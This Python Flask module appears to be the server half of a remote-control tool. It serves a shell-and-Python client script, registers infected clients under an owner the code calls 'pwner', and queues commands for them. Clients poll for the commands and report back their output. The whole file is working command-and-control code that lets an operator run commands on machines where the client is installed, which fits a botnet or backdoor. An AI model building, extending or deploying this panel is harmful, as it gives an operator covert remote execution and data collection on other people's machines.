from flask import request, redirect, url_for, flash, render_template, Blueprint
from flask_login import current_user, login_user, logout_user, login_required
from sqlalchemy.exc import IntegrityError
from datetime import datetime
from hashlib import sha256
from os import urandom
import json

from .forms import RegisterClientForm, PingForm
from ..app import db
from ..models import Client, Command, User

client = Blueprint('client', __name__, url_prefix='/client')


@client.route('/')
def serve_client():
    return open(
        'web/client/shell/shell.sh'
    ).read().format(
        python=open(
            'web/client/shell/shell.py'
        ).read(),
    )

@client.route('/register/<owner>', methods=['POST'])
def register_client(owner):
    pwner=User.query.filter_by(username=owner).first().id
    try:
        c=Client(
            clientname=request.form['clientname'],
            uname=request.form['uname'],
            registration_time=datetime.utcnow(),
            ownerid=pwner,
        )
        c.set_key()
        db.session.add(c)
        db.session.commit()
        return json.dumps([c.id, c.key])
    except IntegrityError as e:
        db.session.rollback()
        return 'err'

@client.route('/get_pending', methods=['POST'])
def get_pending():
    """
    This is where the client ping us for their
    next set of commands.

    :return json: the pending commands
    """
    client=Client.query.filter_by(id=request.form['clientid']).first()
    if client.key != request.form['key']:
        return 'nahhhhhhh bro', 403
    return json.dumps({
        c.id: c.command
        for c in client.commands
        if c.pending
    })

@client.route('/submit_pending', methods=['POST'])
def submit_pending():
    """
    report := {
        commandid : stdout,
        ...
    }
    """
    clientid=request.json['clientid']
    report=request.json['report']
    commands=Command.query.filter(*(
        Command.id==c
        for c in report.keys()
    )).all()

    try:
        for c in commands:
            if c.pending:
                c.set_submission(report[c.id])
    except IntegrityError as e:
        print('error:', e)
        db.session.commit()
    return 'thanks bro'

@client.route('/getinfo/<clientid>')
@login_required
def getinfo(clientid):
    client=Client.query.filter_by(id=clientid).first()
    if client.owner[0].id != current_user.id:
        return 'not found', 404
    commands = [
        command.dump()
        for command in client.commands
    ]
    return json.dumps({
        'pending': list(filter(
            lambda x: x.pending,
            commands
        )),
        'finished': list(filter(
            lambda x: not x.pending,
            commands
        ))
    })
